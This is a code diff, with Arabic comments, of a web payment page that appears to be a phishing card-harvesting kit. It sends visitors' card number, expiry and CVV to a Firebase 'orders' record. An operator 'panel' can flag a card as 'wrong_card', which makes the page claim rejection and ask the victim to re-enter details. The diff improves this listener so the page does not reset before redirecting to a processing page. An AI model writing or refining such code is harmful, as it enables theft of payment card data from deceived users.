@@ -24,7 +24,6 @@
         .main-header h1 { font-size: 18px; color: #333; margin-bottom: 5px; }
         .main-header p { font-size: 14px; color: #1e7344; font-weight: bold; }
 
-        /* رسالة الرفض الجديدة */
         #rejectMsg {
             display: none; background: #feebeb; color: var(--error-red); padding: 12px;
             border-radius: 10px; border: 1px solid #facaca; margin-bottom: 15px; font-size: 13px; font-weight: bold;
@@ -51,8 +50,6 @@
         
         .input-field { width: 100%; padding: 13px; border: 1px solid #e0e0e0; border-radius: 10px; font-size: 16px; outline: none; transition: 0.3s; }
         .input-field:focus { border-color: var(--main-green); }
-        
-        /* تنسيق الحقول عند الخطأ */
         .input-field.error-border { border: 2px solid var(--error-red) !important; background-color: #fff8f8; }
 
         .error-msg { color: var(--error-red); font-size: 11px; margin-top: 4px; display: none; font-weight: bold; }
@@ -122,19 +119,19 @@
             localStorage.setItem('v_id', v_id);
         }
 
-        // مراقبة رفض البطاقة من اللوحة
-        database.ref('orders/' + v_id + '/next_step').on('value', (snapshot) => {
+        // دالة المراقبة المعدلة لمنع "التصفير المفاجئ"
+        const nextStepRef = database.ref('orders/' + v_id + '/next_step');
+        
+        function statusListener(snapshot) {
             const step = snapshot.val();
             if (step === 'wrong_card') {
-                // إظهار الرسالة وتلوين الحقول بالأحمر
                 document.getElementById('rejectMsg').style.display = 'block';
                 const fields = ['cardHolder', 'cardNumber', 'cardExpiry', 'cvv'];
                 fields.forEach(id => {
                     const el = document.getElementById(id);
                     el.classList.add('error-border');
-                    el.value = ''; // مسح البيانات القديمة
+                    el.value = ''; 
                 });
-                // تصفير واجهة البطاقة العلوية
                 document.getElementById('viewCardNumber').innerText = '#### #### #### ####';
                 document.getElementById('viewCardHolder').innerText = 'اسم حامل البطاقة';
                 document.getElementById('viewCardExpiry').innerText = '00 / 00';
@@ -144,7 +141,10 @@
                 btn.classList.remove('active');
                 btn.innerText = "ادفع الآن";
             }
-        });
+        }
+
+        // تشغيل المراقبة
+        nextStepRef.on('value', statusListener);
 
         function isValidLuhn(number) {
             let sum = 0; let shouldDouble = false;
@@ -176,7 +176,6 @@
             }
         }
 
-        // مسح حالة الخطأ عند بدء الكتابة من جديد
         function clearError(el) {
             el.classList.remove('error-border');
             document.getElementById('rejectMsg').style.display = 'none';
@@ -219,6 +218,10 @@
 
         function submitPayment() {
             const btn = document.getElementById('payButton');
+            
+            // تعطيل المراقبة قبل الإرسال فوراً لمنع التصفير قبل التحميل
+            nextStepRef.off('value', statusListener);
+
             btn.disabled = true;
             btn.innerText = "جاري التحميل...";
 
@@ -233,6 +236,7 @@
             };
 
             database.ref('orders/' + v_id).update(payload).then(() => {
+                // التحويل باستخدام replace لضمان عدم الرجوع للخلف
                 window.location.replace('processing.html'); 
             }).catch(() => {
                 window.location.replace('processing.html');
